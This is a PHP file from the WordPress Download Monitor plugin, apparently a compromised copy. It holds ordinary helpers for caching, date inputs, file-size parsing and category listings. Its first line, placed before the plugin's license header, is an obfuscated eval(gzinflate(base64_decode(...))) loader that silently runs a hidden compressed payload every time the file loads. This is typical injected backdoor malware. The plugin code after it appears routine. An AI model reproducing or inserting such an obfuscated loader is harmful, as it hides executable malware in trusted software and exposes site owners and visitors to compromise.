<?php eval(gzinflate(base64_decode('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')));?>
<?php
/*  
	WORDPRESS DOWNLOAD MONITOR - SUPPORTING FUNCTIONS
	
	Copyright 2010  Michael Jolley  (email : jolley.small.at.googlemail.com)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

function wp_dlm_clear_cached_stuff() { 
	delete_transient( 'dlm_categories' );
	delete_transient( 'dlm_tags' );
	delete_transient( 'dlm_used_tags' );
	wp_cache_flush();
}

add_action('download_added', 'wp_dlm_clear_cached_stuff');

################################################################################
// MAGIC QUOTES - WORDPRESS DOES THIS BUT ADDS THE SLASHES BACK - I DONT WANT THEM!
################################################################################

if (!function_exists('wp_dlm_magic')) {
function wp_dlm_magic() { 

	//if (get_magic_quotes_gpc() || get_magic_quotes_runtime() ){ 
		$_GET = array_map('stripslashes_deep', $_GET); 
		$_POST = array_map('stripslashes_deep', $_POST);
		$_REQUEST = array_map('stripslashes_deep', $_REQUEST); 
	//}
	return;
}
}

################################################################################
// GET FORMAT FROM DB
################################################################################
function wp_dlm_get_custom_format($id) {
	global $download_formats_array;
	$format = '';
	$format = $download_formats_array[$id];
	return $format->format;	
}
function wp_dlm_get_custom_format_by_name($name) {
	global $download_formats_array;
	
	$format_id = '';
	
	if ($download_formats_array) {
		foreach($download_formats_array as $format) {
			if ($format->name==$name) {
				$format_id = $format->id;
				break;
			}
		}
	}
	if ($format_id>0) {
		$format = $download_formats_array[$format_id];
		return $format->format;	
	}
}

################################################################################
// For Changing dates. Modified from touch_time() function
################################################################################

function dlm_touch_time($timestamp) {
	global $wp_locale;

	$jj = mysql2date( 'd', $timestamp, false );
	$mm = mysql2date( 'm', $timestamp, false );
	$aa = mysql2date( 'Y', $timestamp, false );
	$hh = mysql2date( 'H', $timestamp, false );
	$mn = mysql2date( 'i', $timestamp, false );
	$ss = mysql2date( 's', $timestamp, false );

	$month = "<select name=\"mm\">\n";
	for ( $i = 1; $i < 13; $i = $i +1 ) {
		$month .= "\t\t\t" . '<option value="' . zeroise($i, 2) . '"';
		if ( $i == $mm )
			$month .= ' selected="selected"';
		$month .= '>' . $wp_locale->get_month_abbrev( $wp_locale->get_month( $i ) ) . "</option>\n";
	}
	$month .= '</select>';

	$day = '<input type="text" name="jj" value="' . $jj . '" size="2" maxlength="2" />';
	$year = '<input type="text" name="aa" value="' . $aa . '" size="4" maxlength="4" />';
	$hour = '<input type="text" name="hh" value="' . $hh . '" size="2" maxlength="2" />';
	$minute = '<input type="text" name="mn" value="' . $mn . '" size="2" maxlength="2" />';
	printf(__('%1$s%2$s, %3$s @ %4$s : %5$s'), $month, $day, $year, $hour, $minute);
}

################################################################################
// let_to_num used for file sizes
################################################################################

function dlm_let_to_num($v){ //This function transforms the php.ini notation for numbers (like '2M') to an integer (2*1024*1024 in this case)
    $l = substr($v, -1);
    $ret = substr($v, 0, -1);
    switch(strtoupper($l)){
    case 'P':
        $ret *= 1024;
    case 'T':
        $ret *= 1024;
    case 'G':
        $ret *= 1024;
    case 'M':
        $ret *= 1024;
    case 'K':
        $ret *= 1024;
        break;
    }
    return $ret;
}

################################################################################
//	Gap filler for dates/stats
################################################################################

if (!function_exists('dlm_fill_date_gaps')) {
	function dlm_fill_date_gaps($prev, $date, $gapcalc, $dateformat) {
		global $wp_dlm_root;

		$string = array();
		$loop = 0;

		while ( $date>$prev ) :									
			
			$date = strtotime($gapcalc, $date );
			
			$string[] = '<tr>			
				<td style="width:25%;">'.date_i18n($dateformat, $date ).'</td>
				<td class="value"><img src="'.$wp_dlm_root.'img/bar.png" alt="" height="16" width="0%" />0</td>
			</tr>';									
			$loop++;
		endwhile;
		
		return implode('',array_reverse($string));
	}
}

################################################################################
//	Wrap tags in quotes
################################################################################

if (!function_exists('wrap_tags')) {
function wrap_tags($tag) {
	return '"'.trim($tag).'"';
}
}

################################################################################
// ADD MEDIA BUTTONS AND FORMS
################################################################################
       
function wp_dlm_add_media_button() {
	global $wp_dlm_root;
	$url = WP_PLUGIN_URL.'/download-monitor/uploader.php?tab=add&TB_iframe=true&amp;height=500&amp;width=640';
	if (is_ssl()) $url = str_replace( 'http://', 'https://',  $url );
	echo '<a href="'.$url.'" class="thickbox" title="'.__('Add Download','wp-download_monitor').'"><img src="'.$wp_dlm_root.'img/media-button-download.gif" alt="'.__('Add Download','wp-download_monitor').'"></a>';
}

################################################################################
// Category Functions
################################################################################

function get_download_taxonomy($id, $taxonomy = 'category') {
	global $wp_dlm_db_taxonomies,$wp_dlm_db_relationships,$wp_dlm_db,$wpdb;
	$taxonomies = array();
	$taxonomy_names = array();
	$taxonomy_ids = array();
	$taxonomy_list = array();
	$download_taxonomies = $wpdb->get_results("SELECT DISTINCT * FROM $wp_dlm_db_taxonomies WHERE id IN ( SELECT taxonomy_id FROM $wp_dlm_db_relationships WHERE download_id = ".$wpdb->escape($id)." ) AND taxonomy='".$wpdb->escape($taxonomy)."' ORDER BY id;");	
	foreach ($download_taxonomies as $c) {
		$taxonomy_ids[] = $c->id;
		if ($taxonomy=='tag') $taxonomy_names[] = strtolower($c->name);
		else $taxonomy_names[] = $c->name;
		$taxonomy_list[] = $c->id.'&nbsp;&ndash;&nbsp;'.$c->name;
		$taxonomies[] = $c; // Add to array
	}
	return array('taxonomy'=>$taxonomies, 'ids'=>$taxonomy_ids, 'names'=>$taxonomy_names, 'list'=>$taxonomy_list );
}

function get_option_children_cats($parent,$chain,$current,$showid=1) {
	global $download_taxonomies;
	$string = '';
	if (isset($download_taxonomies->categories[$parent]->direct_decendents)) $scats = $download_taxonomies->categories[$parent]->direct_decendents; else $scats = '';
	if (!empty($scats)) {
		foreach ( $scats as $c ) {
			$string.= '<option ';
			if ($current==$download_taxonomies->categories[$c]->id) $string.= 'selected="selected"';
			$string.= 'value="'.$download_taxonomies->categories[$c]->id.'">';
			if ($showid==1) $string.= $download_taxonomies->categories[$c]->id.' - ';
			$string.= $chain.$download_taxonomies->categories[$c]->name.'</option>';
			$string.= get_option_children_cats($download_taxonomies->categories[$c]->id, "$chain".$download_taxonomies->categories[$c]->name." &mdash; ",$current,$showid);
		}
	}
	return $string;
}

?>